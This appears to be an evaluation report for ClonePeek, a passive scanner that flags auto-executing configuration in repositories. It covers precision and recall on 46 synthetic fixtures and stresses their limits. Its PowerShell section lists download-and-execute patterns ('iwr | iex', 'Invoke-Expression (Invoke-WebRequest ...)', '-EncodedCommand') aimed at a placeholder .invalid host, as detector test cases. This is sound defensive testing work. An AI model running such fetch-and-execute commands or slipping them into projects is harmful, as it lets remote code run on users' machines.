# Synthetic execution-config evaluation — ClonePeek v0.2.2

**These numbers are not real-world security detection accuracy.** All 46
fixtures are small, consent-safe, intentionally hand-authored examples, not a
random or representative sample of open-source repositories or attacks. They
were constructed from known detection rules and modeled limitations. Their
labels are subjective review judgments, not ground truth that a repository is
malicious.

## Reproduce exactly

Use Python 3.10+ from a source checkout:

```bash
python -m pip install -e .
python -m evaluation.evaluate
python -m evaluation.evaluate --format json
python -m unittest discover -s tests -v
```

The fixed corpus is versioned in
[evaluation/cases.json](../evaluation/cases.json). Every case stores
a unique ID, a configuration path, the content to scan, a separately
specified high-risk Boolean label, expected execution-surface rules and
an English rationale. The evaluator creates one private temporary directory
per case, writes a harmless configuration, and invokes the real passive
scanner. It never launches script, shell, PowerShell, Git hooks or MCP code
from a fixture. Download URLs in simulated commands use `.invalid`
domains. All created fixture data is deleted when evaluation finishes.

## High-risk classification at a high/critical threshold

| Outcome | Cases |
| --- | ---: |
| True positives | 15 |
| False positives | 3 |
| False negatives | 2 |
| True negatives | 26 |
| Total | 46 |

**Precision = 15/18 = 83.3%. Recall = 15/17 = 88.2%.**
This is a score on this designed fixture set, **not** a measured estimate
for internet repositories. None of these labels says a given execution
surface is malicious; the threshold indicates relative review urgency.

Three **false positives** are harmless folder-open VS Code tasks
(an `echo`, a hidden-terminal `echo`, and a syntax check). They are still
real execution surfaces, which ClonePeek intentionally labels `high` by
default. Two **false negatives** are dangerous behavior inside a
referenced local script, which the scanner does not follow. Those still
appear as `medium` npm lifecycle findings, not as a clean bill of health.

## Per-rule surface-presence evaluation

The following separate metric asks whether a rule's **execution surface**
was recognized in a particular fixture. This is not the same as
high-risk classification or proof of malicious code.

| Rule | Labeled positives | TP | FP | FN | Corpus precision | Corpus recall |
| --- | ---: | ---: | ---: | ---: | ---: | ---: |
| vscode-folder-open | 5 | 5 | 0 | 0 | 100% | 100% |
| npm-lifecycle | 12 | 12 | 0 | 0 | 100% | 100% |
| devcontainer-lifecycle | 5 | 5 | 0 | 0 | 100% | 100% |
| devcontainer-feature | 2 | 2 | 0 | 0 | 100% | 100% |
| mcp-server-process | 5 | 5 | 0 | 0 | 100% | 100% |
| claude-hook-command | 7 | 7 | 0 | 0 | 100% | 100% |
| config-parse | 2 | 2 | 0 | 0 | 100% | 100% |
| oversize-config | 0 | 0 | 0 | 0 | n/a | n/a |
| unreadable-config | 0 | 0 | 0 | 0 | n/a | n/a |

The evaluator reports per-rule confusion counts and
Wilson 95% intervals with the JSON output. **Perfect scores on tiny,
purposely chosen fixtures are not evidence of perfect recall**.
The Wilson interval is a diagnostic under a hypothetical independent
sample; the corpus is neither independent nor representative, so those
intervals must not be promoted as real-world performance estimates.
For a rule with zero support, recall is correctly reported as `null`,
not 100%.

## Windows PowerShell coverage

New synthetic fixtures cover `iwr ... | iex`,
`iex (iwr https://example.invalid/x.ps1).Content`,
the longer `Invoke-Expression (Invoke-WebRequest -Uri ...).Content`,
`-EncodedCommand`, benign `Write-Host`, benign `Get-ChildItem`,
and ordinary local PowerShell launch arguments. The new
expression-style download-and-execute examples **failed before the
v0.2.2 detector fix** and classify as `critical` after it.
Harmless PowerShell examples do not classify as critical.

## Limitations and next evaluation step

- Only known, recognized JSON/JSONC configuration families are tested.
  Arbitrary nested scripts, archives, shell aliases, CI/CD provider
  configuration and unfamiliar formats may escape detection.
- Treat an execution surface as a prompt for manual review, not a verdict
  about author intent or command safety.
- A high-risk score can be wrong in both directions; even a synthetic corpus
  with a 100% score would not justify a field claim.
- For externally valid estimates, recruit independent reviewers to label
  representative permitted repository samples, keep a blind holdout, track
  agreement and report uncertainty. Do not tune against the final holdout.

See [the heuristic rules](RULES.md), [threat model](THREAT_MODEL.md),
and [the full evaluation source](../evaluation/evaluate.py).
